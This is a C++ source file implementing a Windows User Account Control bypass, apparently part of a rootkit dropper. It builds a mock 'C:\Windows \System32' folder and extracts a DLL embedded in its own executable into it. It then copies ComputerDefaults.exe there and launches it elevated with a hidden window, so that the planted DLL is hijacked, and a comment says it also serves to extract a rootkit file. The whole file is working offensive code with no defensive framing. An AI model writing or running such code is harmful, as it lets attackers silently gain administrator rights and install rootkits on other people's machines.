#include "UAC.h"

PVOID GetImageBase() // Get Image Base
{
	PDWORD virtual_address = PDWORD(&GetImageBase);
	PDWORD image_base = NULL;

	__asm
	{
		mov eax, virtual_address
		and eax, 0xFFFF0000
		IterateImage:
		cmp WORD PTR[eax], 0x5A4D
			je EndIteration
			sub eax, 0x00010000
			jmp IterateImage
			EndIteration :
		mov[image_base], eax
	}
	return image_base;
}

// Bypass User Account Control using mock folder & dll hijacking. And Extract RootKit File
bool BypassUAC::StartBypassUAC()
{
	std::string legitComputerDefaults_path = "C:\\Windows\\System32\\ComputerDefaults.exe";

	std::string mockComuterDefaults_path = COMPUTERDEFAULTS_PATH;

	system("mkdir \"c:\\Windows \\\""); // Create Windows Mock Folder.

	PBYTE module_base = PBYTE(GetImageBase());
	if (module_base != ERROR)
	{
		if (!dirExists(MOCK_FOLDER_PATH))
			if (CreateDirectoryA(MOCK_FOLDER_PATH.c_str(), NULL)) // Create Windows System32 Mock Folder.
				std::cout << "Create Mock Folder Success!\n";

		if (ExtractFileFromSection(module_base, MOCK_FOLDER_PATH, BYPASS_UAC_DLL_NAME + ".dll", DLL_SECTION_INDEX)) // Extract DLL 
		{
			std::cout << "Extract File Success!\n\n";
			if (FileExists(SECURE32_PATH))
			{
				if (FileExists(legitComputerDefaults_path))
				{
					if (CopyFileA(legitComputerDefaults_path.c_str(), COMPUTERDEFAULTS_PATH.c_str(), FALSE)) // Copy computerdefauls.exe to Windows System32 Mock Folder.
					{
						std::cout << "Start " << COMPUTERDEFAULTS_PATH << "\n";

						SHELLEXECUTEINFOA shExInfo = { 0 };
						shExInfo.cbSize = sizeof(shExInfo);
						shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
						shExInfo.hwnd = 0;
						shExInfo.lpVerb = "runas";                // Operation to perform
						shExInfo.lpFile = mockComuterDefaults_path.c_str();       // Application to start    
						shExInfo.lpParameters = "";                  // Additional parameters
						shExInfo.lpDirectory = 0;
						shExInfo.nShow = SW_HIDE;
						shExInfo.hInstApp = 0;

						if (ShellExecuteExA(&shExInfo))
						{
							if (shExInfo.hProcess == INVALID_HANDLE_VALUE)
							{
								std::cout << "Create Process Failed. Error code #" << GetLastError() << "\n";
								return false;
							}

							std::cout << "Create Process " << COMPUTERDEFAULTS_PATH << " Success!\n";
							return true;
						}
					}
					else
						DeleteFileA(SECURE32_PATH.c_str());
				}
			}
		}
		else
			std::cout << "Create Mock Folder Failed. Error code #" << GetLastError() << "\n";
	}

	return false;
}